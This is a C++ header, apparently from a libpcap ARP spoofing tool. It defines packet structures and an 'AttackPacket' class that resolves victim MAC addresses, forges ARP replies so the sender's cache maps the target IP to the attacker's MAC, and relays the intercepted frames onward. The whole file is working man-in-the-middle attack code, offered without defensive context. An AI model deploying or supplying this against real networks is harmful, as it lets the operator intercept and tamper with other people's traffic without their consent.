#pragma once

#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "util.h"
#include <mutex>

using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;

	EthArpPacket() {
		eth_.type_ = htons(EthHdr::Arp);
		arp_.hrd_ = htons(ArpHdr::ETHER);
		arp_.pro_ = htons(EthHdr::Ip4);
		arp_.op_ = htons(ArpHdr::Request);
		arp_.hln_ = Mac::SIZE;
		arp_.pln_ = Ip::SIZE;
	}

	EthArpPacket(u_char *data) {
		memcpy(&eth_, data, sizeof(EthHdr));
		memcpy(&arp_, data+sizeof(EthHdr), sizeof(ArpHdr));
	}

	EthArpPacket(int value) {
		memset(&eth_, value, sizeof(EthHdr));
		memset(&arp_, value, sizeof(ArpHdr));
	}

	template <typename T1, typename T2>
	void set_eth_mac(T1 smac, T2 dmac) {
		eth_.dmac_ = Mac(dmac);
		eth_.smac_ = Mac(smac);
	}
	template <typename T1, typename T2>
	void set_arp_mac(T1 smac, T2 dmac) {
		arp_.smac_ = Mac(smac);
		arp_.tmac_ = Mac(dmac);
	}
	template <typename T1, typename T2>
	void set_arp_ip(T1 sip, T2 tip) {
		arp_.sip_ = htonl(Ip(sip));
		arp_.tip_ = htonl(Ip(tip));
	}

	bool isNULL() {
		return (eth_.isNull() || arp_.isNull());
	}
};
struct AttackPacket final {
	Ip myIp;
	Mac myMac;
	Ip senderIp;
	Mac senderMac;
	Ip targetIp;
	Mac targetMac;
	EthArpPacket packet;
	pcap_t *handle;
	bool is_ready;

	template <typename T1, typename T2>
	AttackPacket(char *interface, pcap_t *h, T1 sip, T2 tip) {
		myIp = Ip(get_my_ip(interface));
		myMac = Mac(get_my_mac(interface));
		senderIp = Ip(sip);
		targetIp = Ip(tip);
		handle = h;
		is_ready = set_attack_Macs();
		if (is_ready) cout << "[*] new Attack Flow generated ("<<string(senderIp)<<") ("<<string(targetIp)<<")" << endl;
		else cout << "[*] Failed to generate new Attack flow ("<<string(senderIp)<<") ("<<string(targetIp)<<")" << endl;
	}

	void set_getMac_packet(Ip who) {
		packet.arp_.op_ = htons(ArpHdr::Request);
		packet.set_eth_mac(myMac, "ff:ff:ff:ff:ff:ff");
		packet.set_arp_ip(myIp, who);
		packet.set_arp_mac(myMac, "00:00:00:00:00:00");
	}

	void set_attack_packet() {
		packet.arp_.op_ = htons(ArpHdr::Reply);
		packet.set_eth_mac(myMac, senderMac);
		packet.set_arp_mac(myMac, senderMac);
		packet.set_arp_ip(targetIp, senderIp);
	}

	bool set_attack_Macs() {
		Mac mac;
		mac = get_mac_for_attack(senderIp);
		if (mac.isNull()) return false;
		senderMac = mac;
		mac = get_mac_for_attack(targetIp);
		if (mac.isNull()) return false;
		targetMac = mac;
		return true;
	}

	Mac get_mac_for_attack(Ip who) {
		EthArpPacket receive;
		struct pcap_pkthdr* header;
		const u_char *pdata;
		int res, i;
		set_getMac_packet(who);
		send_my_packet();
		for (i = 0; i < 8; i++) {
			res = pcap_next_ex(handle, &header, &pdata);
			if (res == 0) continue;
			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
				fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			memcpy(reinterpret_cast<void *>(&receive), pdata, sizeof(EthArpPacket));
			if (is_arp_for_me(receive)) break;
		}
		if (i == 8) return Mac(0);
		return Mac(receive.arp_.smac());
	}

	int send_my_packet() {
		return pcap_sendpacket(handle, reinterpret_cast<u_char *>(&packet), sizeof(EthArpPacket));
	}

	bool is_arp_for_me(EthArpPacket& etharp) {
		return (etharp.eth_.type() == EthHdr::Arp && \
				etharp.eth_.dmac() == myMac && \
				etharp.arp_.tmac() == myMac);
	}

	bool is_broadcast_from_sender(EthArpPacket& etharp) {
		return (etharp.eth_.dmac() == myMac && \
				etharp.eth_.smac() == senderMac && \
				etharp.arp_.tmac() == Mac("00:00:00:00:00:00") && \
				etharp.arp_.smac() == senderMac);
	}

	void relay_send(vector<u_char>& d) {
		EthHdr *eth = reinterpret_cast<EthHdr*>(d.data());
		eth->dmac_ = targetMac;
		eth->smac_ = myMac;
		pcap_sendpacket(handle, d.data(), d.size());
	}
};
#pragma pack(pop)